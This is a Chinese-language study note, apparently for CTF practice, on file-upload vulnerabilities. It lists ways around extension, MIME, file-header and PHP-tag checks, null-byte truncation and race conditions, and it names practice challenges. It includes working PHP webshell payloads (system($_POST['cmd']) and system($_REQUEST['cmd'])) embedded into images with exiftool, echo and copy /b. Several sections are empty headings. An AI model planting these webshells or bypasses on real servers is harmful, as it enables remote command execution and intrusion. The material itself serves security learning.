# 文件上传

文件上传通常有两个目的，第一是直接上传PHP等可执行文件，进而获取webshell。第二是通过上传包含有PHP代码的文件，再结合文件包含来获取webshell。

## 常用方法
### 客户端校验绕过

### 文件扩展名检测绕过

- 大小写绕过`pHp`
  - 检查时忽略大小写
- 双写绕过`phphpp`
  - 替换为空，替换后新的字符串为preg_replace(,'')
- 罕见后缀
  - ^\.ph(p[3457]?|t|tml|ps)$
- 解析特性
  - 1.php.666
  - /1.jpg/1.php


### 文件截断绕过（CVE-2006-7243）


```
**PHP before 5.3.4 **accepts the \0 character in a pathname, which might allow context-dependent attackers to bypass intended access restrictions by placing a safe file extension after this character, as demonstrated by .php\0.jpg at the end of the argument to the file_exists function.
```

### `Content-Type`检测绕过（MIME绕过）

`Content-Type`是一个HTTP头部字段，用于指示资源的原始媒体类型。`MIME`是媒体类型的一种标准。`Content-Type`字段使用`MIME`来表示媒体类型，是使用`MIME`的具体方式。

`MIME`类型的结构包括`类型`和`子类型`两部分，中间用斜杠`/`分割。[点击进一步了解](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types)

`Content-Type`检测绕过方法为，直接修改为`image/png` , `text/plain`等。

- [getimagesize](https://www.php.net/manual/zh/function.getimagesize.php)
  - 在脚本文件开头补充图片对应的头部值，或在图片后写入脚本代码

### 文件内容绕过

- 文件头检测
  - `GIF89a`
- [PHP语言标记](/Web/PHP?id=标记)检测，在PHP 7以前版本，通常使用脚本标记`<script language="php"></script>`绕过

## 制作图片马

图片马指的是正常图片中包含有代码，常用制作方法如下：

```powershell
copy /b 1.jpg+1.php 2.jpg
```

```shell
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
```
## 条件竞争

先保存文件，再检测文件内容。利用时间差，访问文件。

## 从文件上传到其他漏洞
## Zip/Tar文件上传后自动解压缩
## php-gd渲染绕过
## 练习题

- upload labs
- SUCTF 2019 Checkin
- GXYCTF2019BabyUpload
- HarekazeCTF2019 Avatar Uploader 

## 经典赛题分析